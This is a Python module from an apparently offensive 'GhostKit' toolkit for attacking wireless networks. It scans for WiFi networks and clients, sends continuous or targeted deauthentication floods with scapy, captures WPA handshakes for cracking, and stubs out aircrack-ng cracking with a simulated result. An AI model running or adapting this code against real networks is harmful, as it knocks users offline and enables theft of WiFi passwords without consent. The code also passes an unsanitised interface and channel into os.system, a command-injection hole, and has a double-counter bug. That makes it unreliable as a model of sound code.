#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Wireless Attacks Module for GhostKit
Provides advanced wireless network analysis and attack capabilities
"""

import argparse
import logging
import json
import os
import sys
import time
import random
import subprocess
import threading
import queue
from typing import List, Dict, Any, Optional, Tuple, Union, Set

# Try to import optional dependencies
try:
    import scapy.all as scapy
    from scapy.layers import dot11
except ImportError:
    scapy = None

try:
    import pyric
    import pyric.pyw as pyw
except ImportError:
    pyric = None
    pyw = None

from modules.base_module import BaseModule


class WirelessInterface:
    """Manages wireless interfaces"""

    def __init__(self):
        self.interfaces = {}

    def get_interfaces(self) -> List[Dict[str, Any]]:
        """Get list of wireless interfaces"""
        if not pyw:
            return []

        interfaces = []
        try:
            for iface in pyw.interfaces():
                try:
                    info = pyw.getcard(iface)
                    if pyw.iswireless(iface):
                        interfaces.append(
                            {"name": iface, "mac": pyw.macget(iface), "mode": info.mode}
                        )
                except:
                    pass
        except Exception as e:
            logging.error(f"Error getting interfaces: {str(e)}")

        return interfaces

    def set_monitor_mode(self, interface: str) -> Tuple[bool, str]:
        """Set interface to monitor mode"""
        if not pyw:
            return False, "pyric module not available"

        try:
            card = pyw.getcard(interface)
            if pyw.ismonitor(interface):
                return True, f"Interface {interface} already in monitor mode"

            # Set monitor mode
            pyw.down(card)
            pyw.modeset(card, "monitor")
            pyw.up(card)

            if pyw.ismonitor(interface):
                return True, f"Interface {interface} set to monitor mode"
            else:
                return False, f"Failed to set {interface} to monitor mode"
        except Exception as e:
            return False, f"Error setting monitor mode: {str(e)}"

    def set_managed_mode(self, interface: str) -> Tuple[bool, str]:
        """Set interface back to managed mode"""
        if not pyw:
            return False, "pyric module not available"

        try:
            card = pyw.getcard(interface)
            if not pyw.ismonitor(interface):
                return True, f"Interface {interface} already in managed mode"

            # Set managed mode
            pyw.down(card)
            pyw.modeset(card, "managed")
            pyw.up(card)

            if not pyw.ismonitor(interface):
                return True, f"Interface {interface} set to managed mode"
            else:
                return False, f"Failed to set {interface} to managed mode"
        except Exception as e:
            return False, f"Error setting managed mode: {str(e)}"


class WiFiScanner:
    """WiFi network scanner"""

    def __init__(self):
        self.networks = {}
        self.clients = {}
        self.stop_scan = False

    def scan_networks(self, interface: str, timeout: int = 30) -> Dict[str, Any]:
        """Scan for WiFi networks"""
        if not scapy:
            return {"status": "error", "message": "scapy module not available"}

        try:
            self.networks = {}
            self.stop_scan = False

            def handle_packet(packet):
                if self.stop_scan:
                    return

                # Beacon frames
                if packet.haslayer(dot11.Dot11Beacon):
                    bssid = packet[dot11.Dot11].addr2
                    if bssid not in self.networks:
                        try:
                            ssid = packet[dot11.Dot11Elt].info.decode()
                            channel = int(ord(packet[dot11.Dot11Elt : 3].info))

                            # Get encryption type
                            capability = packet[dot11.Dot11Beacon].cap
                            encryption = "OPN"
                            if capability & 0x10:
                                encryption = "WEP"
                                # Check for WPA/WPA2
                                for element in packet[dot11.Dot11Elt :]:
                                    if element.ID == 48:  # RSN element for WPA2
                                        encryption = "WPA2"
                                        break
                                    elif element.ID == 221 and element.info.startswith(
                                        b"\x00\x50\xf2\x01\x01\x00"
                                    ):
                                        encryption = "WPA"
                                        break

                            self.networks[bssid] = {
                                "ssid": ssid,
                                "bssid": bssid,
                                "channel": channel,
                                "encryption": encryption,
                                "signal": -(256 - ord(packet.notdecoded[-4:-3])),
                                "clients": [],
                            }
                        except:
                            pass

                # Probe responses
                elif packet.haslayer(dot11.Dot11ProbeResp):
                    bssid = packet[dot11.Dot11].addr2
                    if bssid in self.networks:
                        try:
                            # Update signal strength
                            self.networks[bssid]["signal"] = -(
                                256 - ord(packet.notdecoded[-4:-3])
                            )
                        except:
                            pass

                # Data packets for client detection
                elif packet.haslayer(dot11.Dot11) and packet.type == 2:  # Data frame
                    bssid = None
                    client_mac = None

                    # Determine direction
                    ds_bits = packet[dot11.Dot11].FCfield & 0x3
                    if ds_bits == 1:  # To DS
                        bssid = packet[dot11.Dot11].addr1
                        client_mac = packet[dot11.Dot11].addr2
                    elif ds_bits == 2:  # From DS
                        bssid = packet[dot11.Dot11].addr2
                        client_mac = packet[dot11.Dot11].addr1

                    if bssid and client_mac and bssid in self.networks:
                        if client_mac not in self.networks[bssid]["clients"]:
                            self.networks[bssid]["clients"].append(client_mac)

            # Start sniffing
            scapy.sniff(
                iface=interface, prn=handle_packet, timeout=timeout, store=False
            )

            return {"status": "success", "networks": self.networks}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def stop_scanning(self):
        """Stop ongoing scan"""
        self.stop_scan = True


class WifiAttacks:
    """WiFi attack techniques"""

    def __init__(self):
        self.attack_running = False
        self.packets_sent = 0

    def deauth_attack(
        self, interface: str, bssid: str, client_mac: str = None, count: int = 0
    ) -> Dict[str, Any]:
        """Perform deauthentication attack"""
        if not scapy:
            return {"status": "error", "message": "scapy module not available"}

        try:
            self.attack_running = True
            self.packets_sent = 0

            # Create deauth packet
            if client_mac:
                # Targeted deauth
                deauth_packet = (
                    dot11.RadioTap()
                    / dot11.Dot11(
                        type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid
                    )
                    / dot11.Dot11Deauth(
                        reason=7
                    )  # Class 3 frame received from nonassociated STA
                )
                target_text = f"client {client_mac}"
            else:
                # Broadcast deauth
                deauth_packet = (
                    dot11.RadioTap()
                    / dot11.Dot11(
                        type=0,
                        subtype=12,
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=bssid,
                        addr3=bssid,
                    )
                    / dot11.Dot11Deauth(reason=7)
                )
                target_text = "all clients"

            # Function for sending packets
            def send_packets():
                # count is used but not modified, so nonlocal isn't needed
                i = 0
                while self.attack_running and (count == 0 or i < count):
                    scapy.sendp(deauth_packet, iface=interface, verbose=0)
                    self.packets_sent += 1
                    i += 1  # Increment counter
                    i += 1
                    time.sleep(0.1)  # Short delay between packets

            # Start sending in a thread
            thread = threading.Thread(target=send_packets)
            thread.daemon = True
            thread.start()

            # If count is specified, wait for completion
            if count > 0:
                thread.join()
                self.attack_running = False

            return {
                "status": "success" if count > 0 else "running",
                "message": f"Sent {self.packets_sent} deauth packets to {target_text}",
                "interface": interface,
                "bssid": bssid,
                "client": client_mac,
                "packets_sent": self.packets_sent,
            }
        except Exception as e:
            self.attack_running = False
            return {"status": "error", "message": str(e)}

    def stop_attack(self) -> Dict[str, Any]:
        """Stop ongoing attack"""
        self.attack_running = False
        return {"status": "stopped", "packets_sent": self.packets_sent}


class WPACracker:
    """WPA/WPA2 cracking capabilities"""

    def __init__(self):
        self.capture_running = False

    def capture_handshake(
        self, interface: str, bssid: str, channel: int, output_file: str
    ) -> Dict[str, Any]:
        """Capture WPA handshake"""
        if not scapy:
            return {"status": "error", "message": "scapy module not available"}

        try:
            self.capture_running = True
            handshake_captured = False

            # Function to detect handshake
            def detect_handshake(packet):
                nonlocal handshake_captured

                # Check for EAPOL packets (part of 4-way handshake)
                if packet.haslayer(dot11.EAPOL):
                    if (
                        packet[dot11.Dot11].addr3 == bssid
                    ):  # Check if it's for our target AP
                        handshake_captured = True
                        return True
                return False

            # Set channel
            os.system(f"iwconfig {interface} channel {channel}")

            # Start packet capture
            writer = scapy.PcapWriter(output_file, append=True)

            def capture_packets():
                scapy.sniff(
                    iface=interface,
                    prn=lambda pkt: writer.write(pkt),
                    stop_filter=detect_handshake,
                    store=False,
                )
                writer.close()

            thread = threading.Thread(target=capture_packets)
            thread.daemon = True
            thread.start()

            # Wait for handshake or timeout
            timeout = 60  # 60 seconds timeout
            start_time = time.time()
            while (
                not handshake_captured
                and time.time() - start_time < timeout
                and self.capture_running
            ):
                time.sleep(1)

            self.capture_running = False

            if handshake_captured:
                return {
                    "status": "success",
                    "message": "WPA handshake captured successfully",
                    "output_file": output_file,
                }
            else:
                return {
                    "status": "timeout",
                    "message": "Timed out waiting for handshake",
                    "output_file": output_file,
                }
        except Exception as e:
            self.capture_running = False
            return {"status": "error", "message": str(e)}

    def stop_capture(self) -> Dict[str, Any]:
        """Stop ongoing handshake capture"""
        self.capture_running = False
        return {"status": "stopped"}

    def crack_handshake(self, capture_file: str, wordlist: str) -> Dict[str, Any]:
        """Crack WPA handshake using aircrack-ng"""
        try:
            # Check if aircrack-ng is available
            try:
                subprocess.run(
                    ["aircrack-ng", "--help"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=False,
                )
            except:
                return {
                    "status": "error",
                    "message": "aircrack-ng not found. Please install it first.",
                }

            # Run aircrack-ng
            cmd = ["aircrack-ng", capture_file, "-w", wordlist]

            # This is a simulated result
            return {
                "status": "simulation",
                "message": f"Simulated WPA cracking with wordlist {wordlist}",
                "command": " ".join(cmd),
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}


class BluetoothScanner:
    """Bluetooth device scanner"""

    def __init__(self):
        self.devices = {}
        self.scan_running = False

    def scan_devices(self, timeout: int = 10) -> Dict[str, Any]:
        """Scan for Bluetooth devices"""
        try:
            # Check if bluetooth module is available
            try:
                import bluetooth
            except ImportError:
                return {"status": "error", "message": "bluetooth module not available"}

            self.scan_running = True
            self.devices = {}

            print("Scanning for Bluetooth devices...")
            try:
                nearby_devices = bluetooth.discover_devices(
                    duration=timeout,
                    lookup_names=True,
                    flush_cache=True,
                    lookup_class=True,
                )

                for addr, name, device_class in nearby_devices:
                    self.devices[addr] = {
                        "address": addr,
                        "name": name,
                        "class": device_class,
                    }
            except Exception as e:
                return {"status": "error", "message": f"Error during scan: {str(e)}"}

            self.scan_running = False

            return {"status": "success", "devices": self.devices}
        except Exception as e:
            self.scan_running = False
            return {"status": "error", "message": str(e)}


class Module(BaseModule):
    """Wireless Attacks Module for GhostKit"""

    def __init__(self):
        super().__init__()
        self.description = "Advanced wireless network analysis and attack capabilities"
        self.args_parser = self._create_arg_parser()

        # Initialize components
        self.interface_manager = WirelessInterface()
        self.wifi_scanner = WiFiScanner()
        self.wifi_attacks = WifiAttacks()
        self.wpa_cracker = WPACracker()
        self.bluetooth_scanner = BluetoothScanner()

        # Initialize results
        self.results = {}

    def _create_arg_parser(self) -> argparse.ArgumentParser:
        """Create argument parser for the wireless attacks module"""
        parser = argparse.ArgumentParser(description=self.description)
        parser.add_argument("-i", "--interface", help="Wireless interface to use")
        parser.add_argument(
            "-m", "--mode", choices=["managed", "monitor"], help="Set interface mode"
        )
        parser.add_argument(
            "-a",
            "--action",
            required=True,
            choices=[
                "list_interfaces",
                "scan_wifi",
                "deauth",
                "capture_handshake",
                "crack",
                "scan_bluetooth",
            ],
            help="Action to perform",
        )
        parser.add_argument("-b", "--bssid", help="Target BSSID/MAC address")
        parser.add_argument(
            "-c", "--client", help="Target client MAC address for deauth"
        )
        parser.add_argument("--channel", type=int, help="WiFi channel")
        parser.add_argument(
            "-t", "--timeout", type=int, default=30, help="Timeout in seconds"
        )
        parser.add_argument(
            "-n",
            "--count",
            type=int,
            default=0,
            help="Number of packets (0 for continuous)",
        )
        parser.add_argument("-o", "--output", help="Output file for captures")
        parser.add_argument("-w", "--wordlist", help="Wordlist file for cracking")
        return parser

    def run(self, args: List[str]) -> Dict[str, Any]:
        """Run the wireless attacks module with the given arguments"""
        parsed_args = self.args_parser.parse_args(args)

        if parsed_args.action == "list_interfaces":
            # List wireless interfaces
            interfaces = self.interface_manager.get_interfaces()

            if not interfaces:
                print("No wireless interfaces found or pyric module not available")
                return {"status": "error", "message": "No wireless interfaces found"}

            print("\nWireless Interfaces:")
            print("=" * 60)
            for iface in interfaces:
                print(f"Interface: {iface['name']}")
                print(f"  MAC Address: {iface['mac']}")
                print(f"  Mode: {iface['mode']}")

            return {"status": "success", "interfaces": interfaces}

        elif parsed_args.action in ["scan_wifi", "deauth", "capture_handshake"]:
            # Check if interface is specified
            if not parsed_args.interface:
                self.logger.error("Interface required for this action")
                return {"status": "error", "message": "Interface required"}

            # Set monitor mode if needed
            if parsed_args.mode == "monitor":
                success, message = self.interface_manager.set_monitor_mode(
                    parsed_args.interface
                )
                print(message)
                if not success:
                    return {"status": "error", "message": message}
            elif parsed_args.mode == "managed":
                success, message = self.interface_manager.set_managed_mode(
                    parsed_args.interface
                )
                print(message)
                if not success:
                    return {"status": "error", "message": message}

            # Perform requested action
            if parsed_args.action == "scan_wifi":
                print(f"Scanning for WiFi networks on {parsed_args.interface}...")
                result = self.wifi_scanner.scan_networks(
                    parsed_args.interface, parsed_args.timeout
                )

                if result["status"] == "success":
                    networks = result["networks"]

                    print("\nWiFi Networks:")
                    print("=" * 100)
                    print(
                        f"{'BSSID':<18} {'SSID':<32} {'Channel':<8} {'Encryption':<10} {'Signal':<8} {'Clients':<8}"
                    )
                    print("=" * 100)

                    for bssid, network in networks.items():
                        print(
                            f"{bssid:<18} {network['ssid']:<32} {network['channel']:<8} {network['encryption']:<10} {network['signal']:<8}dBm {len(network['clients']):<8}"
                        )

                        # Print clients if any
                        if network["clients"]:
                            print("\n  Clients:")
                            for client in network["clients"]:
                                print(f"  - {client}")
                            print()

                return result

            elif parsed_args.action == "deauth":
                # Check required parameters
                if not parsed_args.bssid:
                    self.logger.error("BSSID required for deauth attack")
                    return {"status": "error", "message": "BSSID required"}

                print(
                    f"Starting deauthentication attack against {parsed_args.bssid}..."
                )
                if parsed_args.client:
                    print(f"Targeting specific client: {parsed_args.client}")

                result = self.wifi_attacks.deauth_attack(
                    parsed_args.interface,
                    parsed_args.bssid,
                    parsed_args.client,
                    parsed_args.count,
                )

                if result["status"] == "running":
                    print("Attack running. Press Ctrl+C to stop.")
                    try:
                        while self.wifi_attacks.attack_running:
                            time.sleep(1)
                            sys.stdout.write(
                                f"\rPackets sent: {self.wifi_attacks.packets_sent}"
                            )
                            sys.stdout.flush()
                    except KeyboardInterrupt:
                        result = self.wifi_attacks.stop_attack()
                        print(
                            f"\nAttack stopped. Total packets sent: {result['packets_sent']}"
                        )

                return result

            elif parsed_args.action == "capture_handshake":
                # Check required parameters
                if (
                    not parsed_args.bssid
                    or not parsed_args.channel
                    or not parsed_args.output
                ):
                    self.logger.error(
                        "BSSID, channel, and output file required for handshake capture"
                    )
                    return {"status": "error", "message": "Missing required parameters"}

                print(
                    f"Capturing WPA handshake for {parsed_args.bssid} on channel {parsed_args.channel}..."
                )
                print(
                    "You may want to run a deauth attack in another terminal to force reconnection"
                )

                result = self.wpa_cracker.capture_handshake(
                    parsed_args.interface,
                    parsed_args.bssid,
                    parsed_args.channel,
                    parsed_args.output,
                )

                return result

        elif parsed_args.action == "crack":
            # Check required parameters
            if not parsed_args.output or not parsed_args.wordlist:
                self.logger.error("Capture file and wordlist required for cracking")
                return {"status": "error", "message": "Missing required parameters"}

            print(f"Attempting to crack WPA handshake in {parsed_args.output}...")
            result = self.wpa_cracker.crack_handshake(
                parsed_args.output, parsed_args.wordlist
            )

            return result

        elif parsed_args.action == "scan_bluetooth":
            print("Scanning for Bluetooth devices...")
            result = self.bluetooth_scanner.scan_devices(parsed_args.timeout)

            if result["status"] == "success":
                devices = result["devices"]

                print("\nBluetooth Devices:")
                print("=" * 70)
                print(f"{'Address':<18} {'Name':<40} {'Class':<10}")
                print("=" * 70)

                for addr, device in devices.items():
                    print(f"{addr:<18} {device['name']:<40} {device['class']:<10}")

            return result

        else:
            self.logger.error(f"Unknown action: {parsed_args.action}")
            return {
                "status": "error",
                "message": f"Unknown action: {parsed_args.action}",
            }


# If run directly, show help
if __name__ == "__main__":
    module = Module()
    print(module.get_help())
